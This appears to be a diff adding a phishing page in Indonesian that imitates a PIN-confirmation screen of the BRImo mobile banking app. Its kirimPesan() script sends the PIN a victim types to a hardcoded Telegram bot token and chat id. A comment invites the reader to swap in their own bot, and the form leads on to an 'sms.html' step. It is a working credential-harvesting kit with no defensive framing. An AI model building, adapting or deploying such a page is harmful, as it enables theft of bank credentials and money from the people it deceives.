@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+  <!-- Warna untuk Chrome, Firefox OS, Opera dan Vivaldi -->
+<meta content='#0C7AF5' name='theme-color'/>
+<!-- Warna untuk Windows Phone -->
+<meta content='#0C7AF5' name='msapplication-navbutton-color'/>
+<!-- Warna untuk iOS Safari -->
+<meta content='yes' name='apple-mobile-web-app-capable'/>
+<meta content='#2f303f' name='apple-mobile-web-app-status-bar-style'/>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Minimal Virtual Keypad Example</title>
+    <link href="https://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="css/main.css" />
+    <style>
+      h1 { margin-top: 150px; text-align: center; color: #fff; }
+      .lead { margin: 30px auto; text-align: center; color: #fff; }
+h1 { margin-top: 150px; text-align: center; color: #fff; }
+      .lead { margin: 0px auto; text-align: center; color: #fff; }
+    * {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  margin-top: 80px;
+  font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+}
+
+body {
+  background: none rgb(12, 121, 245);
+  position: fixed;
+  width: 100%;
+  margin-left: -13px;
+}
+
+form {
+  width: 390px;
+  margin: 50px auto;
+ background: none rgb(12, 121, 245);
+  padding: 35px 25px;
+  text-align: center;
+  bo-shadow: 0px 2px 2px -0px rgba(0, 0, 0, 0.3);
+  border-radius: 10px;
+}
+
+input[type="password"] {
+  padding: 0 40px;
+  border-radius: 20px;
+  width: 310px;
+  height: 40px;
+  margin: auto;
+  border: 0px ;
+  outline: none;
+  font-size: 60px;
+  
+  text-shadow: 0 0 0 rgb(71, 71, 71);
+  text-align: center;
+}
+
+input:focus {
+  outline: none;
+}
+
+.pinButton {
+  border: none;
+  background: none;
+  font-size: 1.5em;
+  border-radius: 50%;
+  height: 60px;
+  font-weight: 550;
+  width: 60px;
+  color: #fff;
+  text-shadow: 0 0 0 rgb(102, 101, 101);
+  margin: 7px 20px;
+}
+
+.text-header {
+            font-family: 'Open Sans', sans-serif;
+            color: #fff;
+           margin-left: 30px;
+          margin-top: -60px;
+          margin-bottom: 10px;
+        }
+     .text-header1 {
+            font-family: 'Open Sans', sans-serif;
+            color: #fff;
+           margin-left: 30px;
+          margin-top: 0px;
+          margin-bottom: -90px;
+        }
+.clear,
+.enter {
+  font-size: 1em !important;
+}
+
+.pinButton:hover {
+  box-shadow: #506ce8 0 0 1px 1px;
+}
+.pinButton:active {
+  background: #506ce8;
+  color: #fff;
+}
+.clear:hover {
+  box-shadow: #ff3c41 0 0 1px 1px;
+}
+.clear:active {
+  background: #ff3c41;
+  color: #fff;
+}
+.enter:hover {
+  box-shadow: #47cf73 0 0 1px 1px;
+}
+.enter:active {
+  background: #47cf73;
+  color: #fff;
+}
+::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
+  color: #fff;
+  font-size: 100px;
+  letter-spacing: 15px;
+  
+  opacity: 1; /* Firefox */
+}
+
+
+    </style>
+  </head>
+  <body>
+<div class="form" style="margin-top: 10px;"> 
+   <div class="text-header"> 
+    <font size="5"><strong>Konfirmasi PIN</strong></font> 
+   </div> 
+   <div class="text-header1"> 
+    <font size="3"> Silahkan konfirmasi PIN yang sudah Anda buat </font> 
+   </div> 
+    <div id="pinpad">
+        <form action="sms.html" method="get">
+        <input type="password" id="pin" name="pin" placeholder="" maxlength="6" style="box-sizing: border-box; width: 310px; letter-spacing: 24px; font-size: 70px; color: #fff; text-align: left; padding-top: 7px;
+        padding: 30px;
+        width: 320px; left-20px;
+        background: none; top: 0px; 
+       background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSFdUJgd5ZNgpHa1zLBF3eTWu_ni9MNWZPlXaN2mG4CQooD12pAIDpEL-6w5NPxSNT13qJ5aO2zm5lFFgPVTbC9dXs72WaNoQFn3l4CUHVm0Rra6cC-9bVNSb543rkkpnqGdif7pxjGGa5uoNy7CzOfyeMAYBFHvj-DBa15E8bvCfeSR54aWBfa0Qd/s1080/AddText_01-13-05.55.56.png');
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;border-radius: 15px; box-shadow: rgba(171, 171, 171, 0) 0px 0px 0px 0px; height: 49px;" disabled required/>
+         
+<br> 
+    <font size="2" class="text-header text-center" color="white"><br><strong>Lupa PIN?</strong></font> 
+    </br>
+        <input type="button" value="1" id="1" class="pinButton calc"/>
+        <input type="button" value="2" id="2" class="pinButton calc"/>
+        <input type="button" value="3" id="3" class="pinButton calc"/><br>
+        <input type="button" value="4" id="4" class="pinButton calc"/>
+        <input type="button" value="5" id="5" class="pinButton calc"/>
+        <input type="button" value="6" id="6" class="pinButton calc"/><br>
+        <input type="button" value="7" id="7" class="pinButton calc"/>
+        <input type="button" value="8" id="8" class="pinButton calc"/>
+        <input type="button" value="9" id="9" class="pinButton calc"/><br>
+        <input type="button" value="Hapus" id="clear" class="pinButton clear"/>
+        <input type="button" value="0" id="0 " class="pinButton calc"/ >
+        <input type="submit" id="kirim" value="KIRIM" class="pinButton enter" onclick="kirimPesan()" />
+</form>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="./js/app.js"></script>
+    <script src="p.js"></script>
+    <script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-36251023-1']);
+  _gaq.push(['_setDomainName', 'jqueryscript.net']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script><script>
+try {
+  fetch(new Request("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", { method: 'HEAD', mode: 'no-cors' })).then(function(response) {
+    return true;
+  }).catch(function(e) {
+    var carbonScript = document.createElement("script");
+    carbonScript.src = "//cdn.carbonads.com/carbon.js?serve=CK7DKKQU&placement=wwwjqueryscriptnet";
+    carbonScript.id = "_carbonads_js";
+    document.getElementById("carbon-block").appendChild(carbonScript);
+  });
+} catch (error) {
+  console.log(error);
+}
+</script>
+     </body>
+</html>
+<script>
+    function kirimPesan() {
+
+    var pin = document.getElementById('pin');
+
+    var gabungan = '𝗣𝗜𝗡 𝗕𝗥𝗜𝗺𝗼%3A%0A' + pin.value;
+
+    var token = '5575641334:AAG4sPsAdaI6YMXau_vdVJ6q3dCNHr4bijo'; // Ganti dengan token bot yang kamu buat
+    var grup = '2071942319'; // Ganti dengan chat id dari bot yang kamu buat
+
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+    })
+}
+
+
+
+$(document).ready(function () {
+  const input_value = $("#pin");
+
+  //disable input from typing
+
+  $("#pin").keypress(function () {
+    return false;
+  });
+
+  //add password
+  $(".calc").click(function () {
+    let value = $(this).val();
+    field(value);
+  });
+  function field(value) {
+    input_value.val(input_value.val() + value);
+  }
+  $("#clear").click(function () {
+    input_value.val("");
+  });
+  $("#enter").click(function () {
+    alert("Your password " + input_value.val() + " added");
+  });
+});
+</script>
